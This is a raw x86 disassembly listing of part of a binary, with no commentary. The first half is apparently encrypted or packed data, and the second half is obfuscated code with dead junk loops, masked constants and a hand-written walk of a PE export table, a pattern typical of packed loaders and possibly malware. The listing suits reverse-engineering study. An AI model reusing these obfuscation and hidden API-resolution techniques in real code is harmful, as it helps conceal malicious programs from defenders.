  404677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404678:	cmp    DWORD PTR [esi+0x54ab6846],ebx
  40467e:	xchg   edx,eax
  40467f:	mov    ebp,0x7f02327b
  404684:	mov    ebx,0x2cc15e8b
  404689:	cld    
  40468a:	cmp    DWORD PTR [esp+ebx*2-0x37],ecx
  40468e:	(bad)  
  40468f:	cld    
  404690:	inc    esp
  404691:	sbb    edi,esp
  404693:	mov    ds:0x3fe31510,eax
  404698:	inc    edx
  404699:	xor    BYTE PTR [ecx-0xc78c6c],cl
  40469f:	shr    BYTE PTR [esi-0x7a],1
  4046a2:	or     esi,DWORD PTR fs:[edi]
  4046a5:	push   ss
  4046a6:	(bad)  
  4046a7:	retf   
  4046a8:	adc    DWORD PTR ds:0x87035f92,ebx
  4046ae:	daa    
  4046af:	dec    esi
  4046b0:	mov    bh,0x82
  4046b2:	push   0xffffffc6
  4046b4:	popf   
  4046b5:	cdq    
  4046b6:	xchg   edx,eax
  4046b7:	out    dx,al
  4046b8:	cmp    ch,BYTE PTR [edi-0x16]
  4046bb:	jp     0x404712
  4046bd:	lahf   
  4046be:	adc    esp,DWORD PTR [ecx+0x57]
  4046c1:	push   cs
  4046c2:	lods   al,BYTE PTR ds:[esi]
  4046c3:	mov    esi,0x1921d3e8
  4046c8:	shl    esp,1
  4046ca:	jb     0x4046bf
  4046cc:	out    0xca,al
  4046ce:	pop    esi
  4046cf:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046d1:	xchg   esp,eax
  4046d2:	dec    ebp
  4046d3:	pop    edi
  4046d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046d5:	and    ecx,ebp
  4046d7:	cmc    
  4046d8:	retf   
  4046d9:	lods   al,BYTE PTR ds:[esi]
  4046da:	or     al,al
  4046dc:	dec    edx
  4046dd:	push   edx
  4046de:	ret    0x2ba9
  4046e1:	fsubr  DWORD PTR ds:0x97b7a697
  4046e7:	es jge 0x404703
  4046ea:	mov    ds:0x2048c47d,al
  4046ef:	repnz fist WORD PTR [ebp+edx*1-0x52]
  4046f4:	scas   al,BYTE PTR es:[edi]
  4046f5:	sbb    eax,0x296df7ca
  4046fa:	out    dx,al
  4046fb:	xor    al,0xca
  4046fd:	call   ebp
  4046ff:	jmp    0x40468b
  404701:	test   BYTE PTR [edi+0x6da428f4],bh
  404707:	dec    ebx
  404708:	and    eax,0xce007a11
  40470d:	mov    eax,ds:0xc9fb2ea7
  404712:	sub    edi,DWORD PTR [edi]
  404714:	inc    edx
  404715:	and    BYTE PTR [ecx],cl
  404717:	push   DWORD PTR [edx]
  404719:	dec    esi
  40471a:	outs   dx,BYTE PTR ds:[esi]
  40471b:	call   0xc50a:0xaedc52d2
  404722:	push   edx
  404723:	imul   eax,DWORD PTR [esi+ebx*2+0x5dc50c3d],0xffffffc1
  40472b:	adc    BYTE PTR [ebx+0x7254649f],al
  404731:	cld    
  404732:	ret    0x4538
  404735:	push   eax
  404736:	sub    al,0x9a
  404738:	sub    ecx,DWORD PTR [esi*8-0x18c7eadd]
  40473f:	nop
  404740:	std    
  404741:	sbb    DWORD PTR [ebp+0x6d5852b8],ecx
  404747:	scas   eax,DWORD PTR es:[edi]
  404748:	test   al,0xe8
  40474a:	ins    DWORD PTR es:[edi],dx
  40474b:	pop    DWORD PTR [esp+eiz*2]
  40474e:	repnz aam 0x7
  404751:	jbe    0x404768
  404753:	jp     0x4047d2
  404755:	test   BYTE PTR [edx+0x22],dl
  404758:	stc    
  404759:	std    
  40475a:	and    al,0x8e
  40475c:	out    0x53,eax
  40475e:	add    ebp,DWORD PTR [ecx+ebp*8+0x4f6f8dd7]
  404765:	xor    DWORD PTR [edx-0x21],ebp
  404768:	xlat   BYTE PTR ds:[ebx]
  404769:	push   ecx
  40476a:	push   0xee7990f8
  40476f:	inc    edi
  404770:	call   0xae9b:0x597dac31
  404777:	and    edi,esi
  404779:	sahf   
  40477a:	lods   al,BYTE PTR ds:[esi]
  40477b:	ds adc eax,0x8dee9ba5
  404781:	idiv   bl
  404783:	cmp    bl,BYTE PTR [ecx-0x5b]
  404786:	sub    eax,0x8c854450
  40478b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40478c:	out    0x22,al
  40478e:	pop    edx
  40478f:	mov    edi,0x4dcbcc0d
  404794:	fdiv   st,st(0)
  404796:	xlat   BYTE PTR ds:[ebx]
  404797:	(bad)  
  404798:	cdq    
  404799:	cmp    edi,DWORD PTR [esi+ebx*4+0x6ee4b14]
  4047a0:	jns    0x4047d4
  4047a2:	jbe    0x40478e
  4047a4:	adc    BYTE PTR [edx],ch
  4047a6:	or     DWORD PTR [eax+0x145d2ed],eax
  4047ac:	and    edx,DWORD PTR [ebx]
  4047ae:	xchg   ebx,eax
  4047af:	jmp    0xb26920e6
  4047b4:	jns    0x404825
  4047b6:	dec    esp
  4047b7:	mov    ds:0x3744a8af,eax
  4047bc:	mov    bh,0x8a
  4047be:	ss scas eax,DWORD PTR es:[edi]
  4047c0:	push   edi
  4047c1:	inc    BYTE PTR [eax-0x18]
  4047c4:	test   al,0xfa
  4047c6:	bound  edi,QWORD PTR [ebp+0x5c2e6e30]
  4047cc:	mov    bh,0x14
  4047ce:	daa    
  4047cf:	mov    eax,0x2f5b8e67
  4047d4:	outs   dx,DWORD PTR ds:[esi]
  4047d5:	dec    ebx
  4047d6:	mov    eax,0x2aae72a8
  4047db:	mov    esp,0x9765dd51
  4047e0:	inc    eax
  4047e1:	push   0xc21de04
  4047e6:	rcr    DWORD PTR [ecx-0x77],1
  4047e9:	jmp    0x938168bf
  4047ee:	scas   eax,DWORD PTR es:[edi]
  4047ef:	fadd   DWORD PTR [eax-0x6d]
  4047f2:	xor    ah,BYTE PTR [ebx-0x6fbc9d8d]
  4047f8:	mov    ebp,0x3f531827
  4047fd:	leave  
  4047fe:	or     al,0x9d
  404800:	mov    ebp,edi
  404802:	fimul  DWORD PTR [ebx+0x484a476e]
  404808:	pop    eax
  404809:	jmp    0xf83f:0x53c2e125
  404810:	icebp  
  404811:	out    dx,eax
  404812:	jle    0x404816
  404814:	mov    es,WORD PTR [ecx-0x5cb6053a]
  40481a:	sub    eax,0x4f4aa91e
  40481f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404820:	mov    al,ds:0x2d61d8c5
  404825:	vxorps ymm5,ymm4,YMMWORD PTR [edi]
  404829:	sbb    DWORD PTR [edx],ebp
  40482b:	pop    esp
  40482c:	mov    WORD PTR [esi+ecx*1],es
  40482f:	hlt    
  404830:	mov    dh,BYTE PTR [edx+0xacdd79f]
  404836:	loop   0x404858
  404838:	fimul  DWORD PTR [ecx+0x1f]
  40483b:	retf   
  40483c:	ja     0x404889
  40483e:	fisub  WORD PTR [eax+0x3f]
  404841:	jmp    0x40488c
  404843:	repnz push ss
  404845:	loop   0x404872
  404847:	test   DWORD PTR [edi+eax*8+0x7e],0x2c34412c
  40484f:	rcl    dh,0xdb
  404852:	mov    ecx,0xec2af7a0
  404857:	cmp    cl,BYTE PTR [ecx-0x4c40b7c3]
  40485d:	mov    WORD PTR [ebx],ss
  40485f:	fstp   st(2)
  404861:	in     al,dx
  404862:	sbb    bh,BYTE PTR ds:0xfe3517ea
  404868:	or     ebp,DWORD PTR [ebx]
  40486a:	lock retf 
  40486c:	push   esi
  40486d:	inc    esp
  40486e:	xor    DWORD PTR ds:0xc90c9367,0xffffffdf
  404875:	jmp    0xe567:0x8597a396
  40487c:	dec    esi
  40487d:	hlt    
  40487e:	cmc    
  40487f:	ror    ah,1
  404881:	iret   
  404882:	in     eax,0x2b
  404884:	iret   
  404885:	jo     0x4048c2
  404887:	xor    al,0xc4
  404889:	mov    WORD PTR [ebx],gs
  40488b:	jmp    0x1d34:0xa91247f3
  404892:	jle    0x4048e3
  404894:	xchg   ebp,eax
  404895:	or     eax,0x97e15008
  40489a:	(bad)  
  40489b:	cmc    
  40489c:	or     DWORD PTR [eax-0x1a],esi
  40489f:	xor    dl,bl
  4048a1:	(bad)  
  4048a2:	call   DWORD PTR [edi+edi*4+0x1a34e20e]
  4048a9:	xor    BYTE PTR [edi-0x217c7bf7],bl
  4048af:	add    al,0x8d
  4048b1:	cmc    
  4048b2:	(bad)  
  4048b3:	nop
  4048b4:	call   0x31fc6ae5
  4048b9:	cmp    dh,BYTE PTR [ebp-0x24]
  4048bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048bd:	add    esi,DWORD PTR [ebx+0x65eef001]
  4048c3:	lods   al,BYTE PTR ds:[esi]
  4048c4:	adc    ah,BYTE PTR [eax]
  4048c6:	or     eax,0xc3f7b965
  4048cb:	sub    esp,DWORD PTR [eax-0x46]
  4048ce:	mov    ebx,0x4499d750
  4048d3:	mov    cl,0xdb
  4048d5:	fwait
  4048d6:	pop    eax
  4048d7:	push   ecx
  4048d8:	sub    DWORD PTR [edx+0x5f6301d7],esp
  4048de:	rol    DWORD PTR [esp+edx*4+0x4c7626fb],1
  4048e5:	adc    ebp,DWORD PTR [edi]
  4048e7:	sub    DWORD PTR [edx+0x2668fd66],ebx
  4048ed:	push   ebp
  4048ee:	loop   0x40488a
  4048f0:	jne    0x40488d
  4048f2:	aad    0xc5
  4048f4:	jne    0x404937
  4048f6:	inc    edi
  4048f7:	add    ch,dl
  4048f9:	fiadd  DWORD PTR [ebx+0x5e]
  4048fd:	das    
  4048fe:	or     eax,0xfe1c45
  404903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404904:	mov    bl,0x7f
  404906:	sub    al,0x57
  404908:	jge    0x4048df
  40490a:	jl     0x404965
  40490c:	shl    BYTE PTR [ecx-0x10],0x3b
  404910:	rol    DWORD PTR [esi],0xec
  404913:	bnd jp 0x4048d1
  404916:	leave  
  404917:	ror    BYTE PTR [ebx-0x6bf79bdc],1
  40491d:	cmp    DWORD PTR [ebp-0x5c],edi
  404920:	imul   edi,eax,0xec0bad79
  404926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404927:	test   al,0xf0
  404929:	sbb    al,BYTE PTR [eax+0xc1927de]
  40492f:	test   eax,0x15efc2a9
  404934:	lds    edx,FWORD PTR ds:0x9af232db
  40493a:	(bad)  
  40493b:	jns    0x404911
  40493d:	enter  0xe6b9,0xc6
  404941:	pop    es
  404942:	push   0xffffff9e
  404944:	das    
  404945:	dec    edi
  404946:	cmp    edx,DWORD PTR ss:[edi+0x59]
  40494a:	inc    eax
  40494b:	jge    0x4048d1
  40494d:	repz rol edi,0x11
  404951:	sbb    esi,DWORD PTR [edi-0x770083f1]
  404957:	adc    dl,bl
  404959:	sub    eax,0x849dfd2f
  40495e:	(bad)  
  40495f:	fild   DWORD PTR [edx+0x5f94547c]
  404965:	clc    
  404966:	fist   DWORD PTR [eax+0xb]
  404969:	test   eax,0x18b51af4
  40496e:	mov    BYTE PTR [esi+0x24ffa965],bl
  404974:	es pop edi
  404976:	(bad)  
  404977:	not    BYTE PTR [eax]
  404979:	pop    ebx
  40497a:	test   DWORD PTR [ebx-0x1b],eax
  40497d:	ins    BYTE PTR es:[edi],dx
  40497e:	loope  0x40497f
  404980:	cmp    cl,BYTE PTR [edi+ebp*4+0x523ed9cc]
  404987:	dec    edi
  404988:	test   DWORD PTR ds:0xd47369d1,0x24aa65e0
  404992:	icebp  
  404993:	xchg   ecx,eax
  404994:	cs out dx,eax
  404996:	push   esi
  404997:	or     esi,0x64f0
  40499d:	mov    edx,0x751089b
  4049a2:	add    DWORD PTR ds:0x435018,0x3361
  4049ac:	xor    ecx,edx
  4049ae:	and    DWORD PTR ds:0x435010,0x0
  4049b8:	xor    esi,esi
  4049ba:	or     esi,DWORD PTR ds:0x435010
  4049c0:	inc    esi
  4049c1:	mov    DWORD PTR ds:0x435010,esi
  4049c7:	cmp    DWORD PTR ds:0x435010,0xb
  4049ce:	jl     0x404a0b
  4049d4:	jmp    0x4049e4
  4049d9:	push   0x1955
  4049de:	call   DWORD PTR ds:0x43a8c4
  4049e4:	cmp    DWORD PTR ds:0x435010,0xa
  4049eb:	jne    0x4049fe
  4049f1:	mov    esi,DWORD PTR ds:0x435010
  4049f7:	inc    esi
  4049f8:	mov    DWORD PTR ds:0x435010,esi
  4049fe:	cmp    DWORD PTR ds:0x435010,0x1c
  404a05:	jb     0x4049b8
  404a0b:	mov    esi,0x3272e2
  404a10:	or     DWORD PTR ds:0x436018,0x436014
  404a1a:	push   edi
  404a1b:	add    edi,DWORD PTR ds:0x43800c
  404a21:	mov    edi,DWORD PTR [ebp+0x10]
  404a24:	add    ecx,esi
  404a26:	mov    DWORD PTR ds:0x43500c,0x38f3
  404a30:	cmp    ecx,edi
  404a32:	mov    DWORD PTR ds:0x43401c,0x3286
  404a3c:	je     0x404b8f
  404a42:	mov    ecx,DWORD PTR [ebp-0x4]
  404a45:	sbb    edi,DWORD PTR ds:0x435014
  404a4b:	mov    edi,DWORD PTR [ebp+0x10]
  404a4e:	xor    eax,eax
  404a50:	xor    DWORD PTR ds:0x435018,0x434028
  404a5a:	xor    ecx,edx
  404a5c:	add    ecx,esi
  404a5e:	mov    DWORD PTR ds:0x434024,0x7740
  404a68:	add    edi,0xfabdbee7
  404a6e:	adc    eax,0xffffffff
  404a71:	inc    DWORD PTR ds:0x437010
  404a77:	xor    eax,0x0
  404a7a:	or     DWORD PTR ds:0x438008,0x434024
  404a84:	mov    DWORD PTR [ebp-0xc],eax
  404a87:	push   ebx
  404a88:	xor    ebx,ebx
  404a8a:	adc    DWORD PTR ds:0x43400c,0x682
  404a94:	xor    edi,0x8a29a12d
  404a9a:	mov    DWORD PTR ds:0x436008,0x12
  404aa4:	cmp    DWORD PTR ds:0x436008,0x0
  404aab:	je     0x404af4
  404ab1:	cmp    DWORD PTR ds:0x436008,0x3
  404ab8:	jle    0x404af4
  404abe:	jmp    0x404acc
  404ac3:	push   DWORD PTR [ebp-0x18]
  404ac6:	call   DWORD PTR ds:0x43a8c8
  404acc:	cmp    DWORD PTR ds:0x436008,0x4
  404ad3:	jne    0x404ae4
  404ad9:	mov    eax,ds:0x436008
  404ade:	dec    eax
  404adf:	mov    ds:0x436008,eax
  404ae4:	mov    eax,ds:0x436008
  404ae9:	dec    eax
  404aea:	mov    ds:0x436008,eax
  404aef:	jmp    0x404aa4
  404af4:	mov    eax,ecx
  404af6:	add    eax,0xfabdbee7
  404afb:	adc    ebx,0xffffffff
  404afe:	xor    eax,0x8a29a12d
  404b03:	xor    ebx,0x0
  404b06:	cmp    eax,edi
  404b08:	jne    0x404b21
  404b0e:	cmp    ebx,DWORD PTR [ebp-0xc]
  404b11:	je     0x404b89
  404b17:	jmp    0x404b21
  404b1c:	mov    esi,0x3272e2
  404b21:	mov    eax,DWORD PTR [ebp-0x4]
  404b24:	mov    edi,DWORD PTR [ebp-0x8]
  404b27:	xor    edi,edx
  404b29:	add    edi,esi
  404b2b:	mov    esi,DWORD PTR [ebp+0x8]
  404b2e:	imul   edi,ecx
  404b31:	mov    ebx,DWORD PTR [ebp+0xc]
  404b34:	xor    eax,edx
  404b36:	add    eax,ecx
  404b38:	mov    al,BYTE PTR [ebx+eax*1+0x3272e2]
  404b3f:	mov    BYTE PTR [edi+esi*1],al
  404b42:	mov    eax,DWORD PTR [ebp-0x8]
  404b45:	mov    esi,DWORD PTR [ebp+0x10]
  404b48:	xor    eax,edx
  404b4a:	xor    ebx,ebx
  404b4c:	add    esi,0xfabdbee7
  404b52:	adc    ebx,0xffffffff
  404b55:	lea    ecx,[ecx+eax*1+0x3272e2]
  404b5c:	xor    edi,edi
  404b5e:	xor    esi,0x8a29a12d
  404b64:	xor    ebx,0x0
  404b67:	mov    eax,ecx
  404b69:	add    eax,0xfabdbee7
  404b6e:	adc    edi,0xffffffff
  404b71:	xor    eax,0x8a29a12d
  404b76:	xor    edi,0x0
  404b79:	cmp    eax,esi
  404b7b:	jne    0x404b1c
  404b81:	cmp    edi,ebx
  404b83:	jne    0x404b1c
  404b89:	mov    eax,0xf89c8584
  404b8e:	pop    ebx
  404b8f:	pop    edi
  404b90:	pop    esi
  404b91:	leave  
  404b92:	ret    0xc
  404b95:	push   ebp
  404b96:	mov    ebp,esp
  404b98:	push   ecx
  404b99:	add    DWORD PTR ds:0x43701c,0x56ef
  404ba3:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  404baa:	mov    eax,DWORD PTR [ebp+0x8]
  404bad:	movsx  eax,BYTE PTR [eax]
  404bb0:	and    DWORD PTR ds:0x436004,0x0
  404bba:	mov    ecx,DWORD PTR ds:0x436004
  404bc0:	inc    ecx
  404bc1:	mov    DWORD PTR ds:0x436004,ecx
  404bc7:	cmp    DWORD PTR ds:0x436004,0x6
  404bce:	ja     0x404c0b
  404bd4:	jmp    0x404be4
  404bd9:	push   0x43a0c9
  404bde:	call   DWORD PTR ds:0x43a8d0
  404be4:	cmp    DWORD PTR ds:0x436004,0x5
  404beb:	jne    0x404bfe
  404bf1:	mov    ecx,DWORD PTR ds:0x436004
  404bf7:	inc    ecx
  404bf8:	mov    DWORD PTR ds:0x436004,ecx
  404bfe:	cmp    DWORD PTR ds:0x436004,0x18
  404c05:	jb     0x404bba
  404c0b:	mov    edx,0x3272e2
  404c10:	neg    ecx
  404c12:	sub    eax,edx
  404c14:	mov    ecx,0x751089b
  404c19:	xor    eax,ecx
  404c1b:	mov    DWORD PTR ds:0x43600c,0x18ff
  404c25:	cmp    eax,0xf89c85f0
  404c2a:	jne    0x404c59
  404c30:	mov    eax,DWORD PTR [ebp+0x8]
  404c33:	push   esi
  404c34:	mov    esi,DWORD PTR [ebp+0x8]
  404c37:	add    esi,DWORD PTR [eax+0x3c]
  404c3a:	mov    DWORD PTR [ebp+0x8],esi
  404c3d:	mov    eax,DWORD PTR [ebp-0x4]
  404c40:	mov    esi,DWORD PTR [ebp+0x8]
  404c43:	xor    eax,ecx
  404c45:	add    eax,edx
  404c47:	cmp    DWORD PTR [esi+0x54],eax
  404c4a:	pop    esi
  404c4b:	je     0x404c59
  404c51:	mov    eax,DWORD PTR [ebp+0x8]
  404c54:	jmp    0x404c60
  404c59:	mov    eax,DWORD PTR [ebp-0x4]
  404c5c:	xor    eax,ecx
  404c5e:	add    eax,edx
  404c60:	leave  
  404c61:	ret    0x4
  404c64:	push   ebp
  404c65:	mov    ebp,esp
  404c67:	sub    esp,0x38
  404c6a:	or     DWORD PTR ds:0x43500c,0x434024
  404c74:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  404c7b:	mov    eax,ds:0x437004
  404c80:	or     DWORD PTR ds:0x434004,eax
  404c86:	push   ebx
  404c87:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  404c8e:	adc    DWORD PTR ds:0x434020,edi
  404c94:	mov    eax,DWORD PTR [ebp-0x4]
  404c97:	xor    DWORD PTR ds:0x437018,0x773f
  404ca1:	push   esi
  404ca2:	xor    DWORD PTR ds:0x435010,0x4a66
  404cac:	mov    esi,0x751089b
  404cb1:	and    DWORD PTR ds:0x435018,0x354c
  404cbb:	xor    eax,esi
  404cbd:	not    DWORD PTR ds:0x436018
  404cc3:	push   edi
  404cc4:	mov    edi,0x3272e2
  404cc9:	add    eax,edi
  404ccb:	xor    DWORD PTR ds:0x434018,0x434000
  404cd5:	mov    DWORD PTR [ebp-0x1c],eax
  404cd8:	and    DWORD PTR ds:0x438010,0x0
  404ce2:	mov    eax,ds:0x438010
  404ce7:	inc    eax
  404ce8:	mov    ds:0x438010,eax
  404ced:	cmp    DWORD PTR ds:0x438010,0xb
  404cf4:	jb     0x404d2f
  404cfa:	jmp    0x404d0a
  404cff:	push   0x43a097
  404d04:	call   DWORD PTR ds:0x43a8d4
  404d0a:	cmp    DWORD PTR ds:0x438010,0xa
  404d11:	jne    0x404d22
  404d17:	mov    eax,ds:0x438010
  404d1c:	inc    eax
  404d1d:	mov    ds:0x438010,eax
  404d22:	cmp    DWORD PTR ds:0x438010,0x14
  404d29:	jb     0x404ce2
  404d2f:	mov    eax,DWORD PTR [ebp+0x14]
  404d32:	sbb    DWORD PTR ds:0x437008,0x2430
  404d3c:	test   eax,eax
  404d3e:	je     0x404d99
  404d44:	and    DWORD PTR ds:0x438000,edx
  404d4a:	mov    eax,DWORD PTR [ebp+0x14]
  404d4d:	and    DWORD PTR ds:0x435014,0x0
  404d57:	xor    ebx,ebx
  404d59:	add    ebx,DWORD PTR ds:0x435014
  404d5f:	inc    ebx
  404d60:	mov    DWORD PTR ds:0x435014,ebx
  404d66:	cmp    DWORD PTR ds:0x435014,0x29
  404d6d:	jl     0x404d8e
  404d73:	jmp    0x404d81
  404d78:	push   DWORD PTR [ebp-0x24]
  404d7b:	call   DWORD PTR ds:0x43a8dc
  404d81:	cmp    DWORD PTR ds:0x435014,0x1a
  404d88:	jb     0x404d57
  404d8e:	mov    eax,DWORD PTR [eax]
  404d90:	or     ebx,DWORD PTR ds:0x438014
  404d96:	mov    DWORD PTR [ebp-0x1c],eax
  404d99:	or     DWORD PTR ds:0x436008,0x1828
  404da3:	mov    eax,DWORD PTR [ebp-0x4]
  404da6:	adc    DWORD PTR ds:0x437014,edi
  404dac:	xor    eax,esi
  404dae:	xor    ebx,ebx
  404db0:	or     ebx,DWORD PTR ds:0x436018
  404db6:	xor    DWORD PTR ds:0x434004,ebx
  404dbc:	add    eax,edi
  404dbe:	mov    DWORD PTR [ebp-0x8],eax
  404dc1:	add    DWORD PTR ds:0x43601c,0x710e
  404dcb:	mov    eax,DWORD PTR [ebp-0xc]
  404dce:	xor    ebx,ebx
  404dd0:	add    ebx,DWORD PTR ds:0x438008
  404dd6:	and    DWORD PTR ds:0x438018,ebx
  404ddc:	xor    eax,esi
  404dde:	and    DWORD PTR ds:0x438010,0x0
  404de8:	xor    ebx,ebx
  404dea:	add    ebx,DWORD PTR ds:0x438010
  404df0:	inc    ebx
  404df1:	mov    DWORD PTR ds:0x438010,ebx
  404df7:	cmp    DWORD PTR ds:0x438010,0x29
  404dfe:	jg     0x404e2c
  404e04:	jmp    0x404e1f
  404e09:	push   0x43a097
  404e0e:	push   DWORD PTR [ebp-0x24]
  404e11:	push   0x5041
  404e16:	push   DWORD PTR [ebp-0x1c]
  404e19:	call   DWORD PTR ds:0x43a8e0
  404e1f:	cmp    DWORD PTR ds:0x438010,0x1d
  404e26:	jb     0x404de8
  404e2c:	add    eax,edi
  404e2e:	movzx  ebx,WORD PTR ds:0x434018
  404e35:	sbb    ebx,DWORD PTR ds:0x434000
  404e3b:	mov    DWORD PTR ds:0x434018,ebx
  404e41:	mov    DWORD PTR [ebp-0x24],eax
  404e44:	mov    eax,DWORD PTR [ebp-0x4]
  404e47:	and    DWORD PTR ds:0x437004,edx
  404e4d:	xor    eax,esi
  404e4f:	add    eax,edi
  404e51:	add    DWORD PTR ds:0x43600c,0x546e
  404e5b:	mov    DWORD PTR [ebp-0x30],eax
  404e5e:	sub    eax,ebx
  404e60:	mov    ebx,DWORD PTR [ebp-0x4]
  404e63:	sub    DWORD PTR ds:0x435008,0x4ecf
  404e6d:	xor    ebx,esi
  404e6f:	sub    DWORD PTR ds:0x436004,edx
  404e75:	add    ebx,edi
  404e77:	adc    DWORD PTR ds:0x438000,0x4ed2
  404e81:	mov    eax,DWORD PTR [ebp-0x24]
  404e84:	xor    DWORD PTR ds:0x435018,0x43700c
  404e8e:	sub    eax,edi
  404e90:	lea    ecx,[ebx-0x3272e2]
  404e96:	xor    eax,esi
  404e98:	adc    DWORD PTR ds:0x436010,0x436014
  404ea2:	xor    ecx,esi
  404ea4:	mov    DWORD PTR ds:0x438004,0x37e0
  404eae:	cmp    ecx,eax
  404eb0:	mov    DWORD PTR ds:0x437000,0x70b7
  404eba:	je     0x4051ec
  404ec0:	and    DWORD PTR ds:0x43701c,0x0
  404eca:	xor    eax,eax
  404ecc:	or     eax,DWORD PTR ds:0x43701c
  404ed2:	inc    eax
  404ed3:	mov    ds:0x43701c,eax
  404ed8:	cmp    DWORD PTR ds:0x43701c,0x6
  404edf:	ja     0x404f2d
  404ee5:	jmp    0x404f08
  404eea:	push   DWORD PTR [ebp-0xc]
  404eed:	push   0x434024
  404ef2:	push   DWORD PTR [ebp-0x10]
  404ef5:	push   0x43a000
  404efa:	push   0x794f
  404eff:	push   DWORD PTR [ebp-0x28]
  404f02:	call   DWORD PTR ds:0x43a8e4
  404f08:	cmp    DWORD PTR ds:0x43701c,0x5
  404f0f:	jne    0x404f20
  404f15:	mov    eax,ds:0x43701c
  404f1a:	inc    eax
  404f1b:	mov    ds:0x43701c,eax
  404f20:	cmp    DWORD PTR ds:0x43701c,0x10
  404f27:	jb     0x404eca
  404f2d:	mov    eax,DWORD PTR [ebp-0x4]
  404f30:	xor    eax,esi
  404f32:	sub    DWORD PTR ds:0x435000,0x434020
  404f3c:	add    eax,edi
  404f3e:	cmp    ebx,eax
  404f40:	jne    0x4051c9
  404f46:	adc    DWORD PTR ds:0x437008,0x435000
  404f50:	push   DWORD PTR [ebp+0x8]
  404f53:	adc    DWORD PTR ds:0x43600c,0x30f1
  404f5d:	call   0x404b95
  404f62:	mov    ecx,DWORD PTR ds:0x437010
  404f68:	sub    DWORD PTR ds:0x434024,ecx
  404f6e:	mov    DWORD PTR [ebp-0x14],eax
  404f71:	and    DWORD PTR ds:0x437014,0x0
  404f7b:	mov    eax,ds:0x437014
  404f80:	inc    eax
  404f81:	mov    ds:0x437014,eax
  404f86:	cmp    DWORD PTR ds:0x437014,0x5
  404f8d:	jl     0x404fd1
  404f93:	jmp    0x404fac
  404f98:	push   DWORD PTR [ebp-0x1c]
  404f9b:	push   0x89c7
  404fa0:	push   DWORD PTR [ebp-0x20]
  404fa3:	push   DWORD PTR [ebp-0x28]
  404fa6:	call   DWORD PTR ds:0x43a8e8
  404fac:	cmp    DWORD PTR ds:0x437014,0x4
  404fb3:	jne    0x404fc4
  404fb9:	mov    eax,ds:0x437014
  404fbe:	inc    eax
  404fbf:	mov    ds:0x437014,eax
  404fc4:	cmp    DWORD PTR ds:0x437014,0x1b
  404fcb:	jb     0x404f7b
  404fd1:	mov    eax,DWORD PTR [ebp-0x4]
  404fd4:	add    ecx,0x29bc
  404fda:	mov    ecx,DWORD PTR [ebp-0x14]
  404fdd:	or     DWORD PTR ds:0x43401c,0x7fb4
  404fe7:	xor    eax,esi
  404fe9:	add    eax,edi
  404feb:	cmp    ecx,eax
  404fed:	je     0x405257
  404ff3:	push   DWORD PTR [ebp-0x14]
  404ff6:	and    DWORD PTR ds:0x438000,0x39ab
  405000:	push   DWORD PTR [ebp+0x8]
  405003:	xor    DWORD PTR ds:0x437010,0x438000
  40500d:	call   0x40a3b2
  405012:	sbb    DWORD PTR ds:0x438014,0x3483
  40501c:	mov    DWORD PTR [ebp-0x14],eax
  40501f:	or     ecx,0x551e
  405025:	mov    eax,DWORD PTR [ebp-0x4]
  405028:	mov    ecx,DWORD PTR ds:0x434010
  40502e:	or     DWORD PTR ds:0x437014,ecx
  405034:	mov    ecx,DWORD PTR [ebp-0x14]
  405037:	sub    DWORD PTR ds:0x43801c,0xa60
  405041:	xor    eax,esi
  405043:	add    eax,edi
  405045:	mov    DWORD PTR ds:0x435004,0x1802
  40504f:	cmp    ecx,eax
  405051:	je     0x405257
  405057:	mov    DWORD PTR ds:0x43701c,0x15
  405061:	cmp    DWORD PTR ds:0x43701c,0x0
  405068:	je     0x4050b4
  40506e:	cmp    DWORD PTR ds:0x43701c,0xa
  405075:	jb     0x4050b4
  40507b:	jmp    0x405086
  405080:	call   DWORD PTR ds:0x43a8f0
  405086:	cmp    DWORD PTR ds:0x43701c,0xb
  40508d:	jne    0x4050a0
  405093:	mov    ecx,DWORD PTR ds:0x43701c
  405099:	dec    ecx
  40509a:	mov    DWORD PTR ds:0x43701c,ecx
  4050a0:	xor    ecx,ecx
  4050a2:	or     ecx,DWORD PTR ds:0x43701c
  4050a8:	dec    ecx
  4050a9:	mov    DWORD PTR ds:0x43701c,ecx
  4050af:	jmp    0x405061
  4050b4:	mov    eax,DWORD PTR [ebp-0x14]
  4050b7:	sub    DWORD PTR ds:0x436010,edi
  4050bd:	mov    eax,DWORD PTR [eax+0x18]
  4050c0:	adc    DWORD PTR ds:0x436000,ebx
  4050c6:	mov    DWORD PTR [ebp-0x24],eax
  4050c9:	mov    DWORD PTR ds:0x434028,0x1f
  4050d3:	cmp    DWORD PTR ds:0x434028,0x0
  4050da:	je     0x40510b
  4050e0:	cmp    DWORD PTR ds:0x434028,0x27
  4050e7:	jl     0x40510b
  4050ed:	jmp    0x4050fb
  4050f2:	push   DWORD PTR [ebp-0x14]
  4050f5:	call   DWORD PTR ds:0x43a8f4
  4050fb:	mov    eax,ds:0x434028
  405100:	dec    eax
  405101:	mov    ds:0x434028,eax
  405106:	jmp    0x4050d3
  40510b:	mov    eax,DWORD PTR [ebp-0x14]
  40510e:	or     ecx,0x2a6b
  405114:	mov    ecx,DWORD PTR [ebp+0x8]
  405117:	xor    DWORD PTR ds:0x438000,0x69f8
  405121:	add    ecx,DWORD PTR [eax+0x20]
  405124:	sbb    DWORD PTR ds:0x436014,0x3915
  40512e:	mov    DWORD PTR [ebp-0x2c],ecx
  405131:	mov    eax,DWORD PTR [ebp-0x14]
  405134:	mov    ecx,DWORD PTR ds:0x43700c
  40513a:	xor    DWORD PTR ds:0x434008,ecx
  405140:	mov    ecx,DWORD PTR [ebp+0x8]
  405143:	add    ecx,DWORD PTR [eax+0x24]
  405146:	xor    eax,eax
  405148:	add    eax,DWORD PTR ds:0x434008
  40514e:	xor    DWORD PTR ds:0x437014,eax
  405154:	mov    DWORD PTR [ebp-0x34],ecx
  405157:	mov    DWORD PTR ds:0x438000,0x1b
